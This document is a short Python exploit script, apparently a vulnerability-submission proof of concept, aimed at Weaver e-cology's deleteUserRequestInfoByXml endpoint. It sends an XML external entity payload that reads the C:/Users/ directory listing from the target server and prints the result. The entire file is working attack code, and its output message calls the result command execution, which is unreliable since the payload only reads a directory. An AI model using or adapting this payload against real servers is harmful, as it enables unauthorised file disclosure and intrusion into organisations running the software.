#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import json
import re

urllib3.disable_warnings()

def verify(site):
    burp0_url = site + "/rest/ofs/deleteUserRequestInfoByXml"
    burp0_headers = {"Content-Type": "application/xml"}
    burp0_data = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>\r\n<!DOCTYPE test[\r\n<!ENTITY\r\nx SYSTEM \"file:///C:/Users/\">\r\n]>\r\n<reset><syscode>&x;</syscode></reset>"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
    if "Public" in r.text:
        return r.text
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 weaver-ecology-byxml-xxe.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，执行命令 path 结果为：", info)
    else:
        print("[-]漏洞不存在")

